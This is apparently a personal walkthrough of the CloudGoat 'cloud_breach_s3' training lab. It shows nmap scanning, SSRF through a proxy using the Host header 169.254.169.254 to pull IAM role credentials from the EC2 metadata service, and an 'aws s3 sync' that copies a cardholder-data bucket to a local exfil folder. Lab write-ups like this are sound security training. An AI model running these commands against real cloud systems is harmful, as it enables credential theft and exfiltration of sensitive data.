Goal - Download the confidential files from the S3 bucket.

```zsh
cloudgoat config whitelist --auto
cloudgoat create cloud_breach_s3

#This gives us a couple of initial info
cloudgoat aws created id of account
cloudgoat target_ec2_server_ip = "184.x.x.x"
```

So we enumerate the ip with nmap to find ssh and web ports open.
```zsh
sudo nmap -sC -sV -p- --open 184.193.16.49
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.18 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesnt have a title (application/octet-stream).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

So we can try examining the web port.
```zsh
curl --path-as-is http://184.193.16.49 
#<h1>This server is configured to proxy requests to the EC2 metadata service. Please modify your request's 'host' header and try again.</h1>
#So, we need a host header, and this server proxies req to the 169 aws metadata ip.

curl -H "Host: 169.254.169.254/latest/meta-data" --path-as-is http://184.193.16.49 
#<head><title>400 Bad Request</title></head>
#Means, we need to specify the url to the proxy's url, and set host as just the was metadata ip

curl -H "Host: 169.254.169.254" --path-as-is http://184.193.16.49/latest/meta-data/
#hit!

curl -H "Host: 169.254.169.254" --path-as-is http://184.193.16.49/latest/meta-data/
#hit!

curl -H "Host: 169.254.169.254" --path-as-is http://184.193.16.49/latest/meta-data/iam/security-credentials
cg-banking-WAF-Role-cgidf3juwawty9

curl -H "Host: 169.254.169.254" --path-as-is http://184.193.16.49/latest/meta-data/iam/security-credentials/cg-banking-WAF-Role-cgidf3juwawty9
#jackpot - we get creds for the banking_waf role
```

```zsh
aws configure --profile bank_waf
aws sts get-caller-identity --profile bank_waf
#verified working

aws iam get-account-summary --profile bank_waf
aws iam get-user --profile bank_waf
#nothing

aws s3 ls --profile bank_waf
2026-10-21 08:52:56 cg-cardholder-data-bucket-cgidf3juwawty9
#so we have a hit on s3 bucket. we enumerate it further

aws s3 ls --profile bank_waf s3://cg-cardholder-data-bucket-cgidf3juwawty9
2026-10-21 08:53:01      58872 cardholder_data_primary.csv
2026-10-21 08:53:01      59384 cardholder_data_secondary.csv
2026-10-21 08:53:02      92165 cardholders_corporate.csv
2026-10-21 08:53:02     249500 goat.png

#we use sync option to download it all
aws s3 sync --profile bank_waf s3://cg-cardholder-data-bucket-cgidf3juwawty9 ./exfil_data

#this marks the end of the scenario!
```